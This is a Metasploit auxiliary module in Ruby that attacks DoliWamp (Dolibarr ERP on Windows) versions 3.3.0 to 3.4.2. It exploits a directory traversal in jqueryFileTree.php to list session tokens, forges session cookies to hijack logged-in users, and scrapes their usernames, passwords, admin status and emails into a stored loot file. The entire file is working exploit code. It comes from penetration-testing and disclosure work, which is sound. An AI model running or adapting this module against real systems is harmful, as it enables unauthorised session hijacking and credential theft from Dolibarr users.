##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(
      info,
      'Name'           => "DoliWamp 'jqueryFileTree.php' Traversal Gather Credentials",
      'Description'    => %q{
          This module will extract user credentials from DoliWamp - a WAMP
        packaged installer distribution for Dolibarr ERP on Windows - versions
        3.3.0 to 3.4.2 by hijacking a user's session. DoliWamp stores session
        tokens in filenames in the 'tmp' directory. A directory traversal
        vulnerability in 'jqueryFileTree.php' allows unauthenticated users
        to retrieve session tokens by listing the contents of this directory.
        Note: All tokens expire after 30 minutes of inactivity by default.
      },
      'License'        => MSF_LICENSE,
      'Author'         => 'Brendan Coles <bcoles[at]gmail.com>',
      'References'     =>
        [
          ['URL', 'https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144'],
          ['URL', 'https://github.com/Dolibarr/dolibarr/commit/8642e2027c840752c4357c4676af32fe342dc0cb']
        ],
      'DisclosureDate' => 'Jan 12 2014'))
    register_options(
      [
        OptString.new('TARGETURI',      [true, 'The path to Dolibarr', '/dolibarr/']),
        OptString.new('TRAVERSAL_PATH', [true, 'The traversal path to the application tmp directory', '../../../../../../../../tmp/'])
      ])
  end

  #
  # Find session tokens
  #
  def get_session_tokens
    tokens = nil
    print_status("Finding session tokens...")
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(
        target_uri.path,
        'includes/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.php'),
      'cookie'    => @cookie,
      'vars_post' => { 'dir' => datastore['TRAVERSAL_PATH'] }
    })
    if !res
      print_error("Connection failed")
    elsif res.code == 404
      print_error("Could not find 'jqueryFileTree.php'")
    elsif res.code == 200 and res.body =~ />sess_([a-z0-9]+)</
      tokens = res.body.scan(/>sess_([a-z0-9]+)</)
      num_tokens = tokens.length.to_s.gsub(/(\d)(?=(\d\d\d)+(?!\d))/) { "#{$1}," }
      print_good("Found #{num_tokens} session tokens")
    else
      print_error("Could not find any session tokens")
    end
    return tokens
  end

  #
  # Get user's credentials
  #
  def get_user_info(user_id)
    vprint_status("Retrieving user's credentials")
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
      'cookie'    => @cookie,
      'vars_get'  => Hash[{
        'action'    => 'edit',
        'id'        => "#{user_id}"
      }.to_a.shuffle]
    })
    if !res
      print_error("Connection failed")
    elsif res.body =~ /User card/
      record = [
        res.body.scan(/name="login" value="([^"]+)"/             ).flatten.first,
        res.body.scan(/name="password" value="([^"]+)"/          ).flatten.first,
        res.body.scan(/name="superadmin" value="\d">(Yes|No)/    ).flatten.first,
        res.body.scan(/name="email" class="flat" value="([^"]+)"/).flatten.first
      ]
      unless record.empty?
        print_good("Found credentials (#{record[0]}:#{record[1]})")
        return record
      end
    else
      print_warning("Could not retrieve user credentials")
    end
  end

  #
  # Verify if session cookie is valid and return user's ID
  #
  def get_user_id
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
      'cookie'    => @cookie
    })
    if !res
      print_error("Connection failed")
    elsif res.body =~ /<div class="login"><a href="[^"]*\/user\/fiche\.php\?id=(\d+)">/
      user_id = "#{$1}"
      vprint_good("Hijacked session for user with ID '#{user_id}'")
      return user_id
    else
      vprint_status("Could not hijack session. Session is invalid.")
    end
  end

  #
  # Construct cookie using token
  #
  def create_cookie(token)
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
      'cookie'    => "DOLSESSID_#{Rex::Text.rand_text_alphanumeric(10)}=#{token}"
    })
    if !res
      print_error("Connection failed")
    elsif res.code == 200 and res.get_cookies =~ /DOLSESSID_([a-f0-9]{32})=/
      return "DOLSESSID_#{$1}=#{token}"
    else
      print_warning("Could not create session cookie")
    end
  end

  #
  # Show progress percentage
  # Stolen from modules/auxiliary/scanner/ftp/titanftp_xcrc_traversal.rb
  #
  def progress(current, total)
    done    = (current.to_f / total.to_f) * 100
    percent = "%3.2f%%" % done.to_f
    vprint_status("Trying to hijack a session - " +
      "%7s done (%d/%d tokens)" % [percent, current, total])
  end

  #
  # Check for session tokens in 'tmp'
  #
  def check
    get_session_tokens ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    return unless tokens = get_session_tokens
    credentials = []
    print_status("Trying to hijack a session...")
    tokens.flatten.each_with_index do |token, index|
      if @cookie = create_cookie(token) and user_id = get_user_id
        credentials << get_user_info(user_id)
      end
      progress(index + 1, tokens.size)
    end

    if credentials.empty?
      print_warning("No credentials collected.")
      return
    end
    cred_table = Rex::Text::Table.new(
      'Header'  => 'Dolibarr User Credentials',
      'Indent'  => 1,
      'Columns' => ['Username', 'Password', 'Admin', 'E-mail']
    )
    credentials.each do |record|
      report_cred(
        ip: rhost,
        port: rport,
        service_name: (ssl ? 'https' : 'http'),
        user: record[0],
        password: record[1],
        proof: @cookie
      )
      cred_table << [record[0], record[1], record[2], record[3]]
    end
    print_line
    print_line("#{cred_table}")
    loot_name     = 'dolibarr.traversal.user.credentials'
    loot_type     = 'text/csv'
    loot_filename = 'dolibarr_user_creds.csv'
    loot_desc     = 'Dolibarr User Credentials'
    p = store_loot(
      loot_name,
      loot_type,
      rhost,
      cred_table.to_csv,
      loot_filename,
      loot_desc)
    print_status("Credentials saved in: #{p}")
  end
end
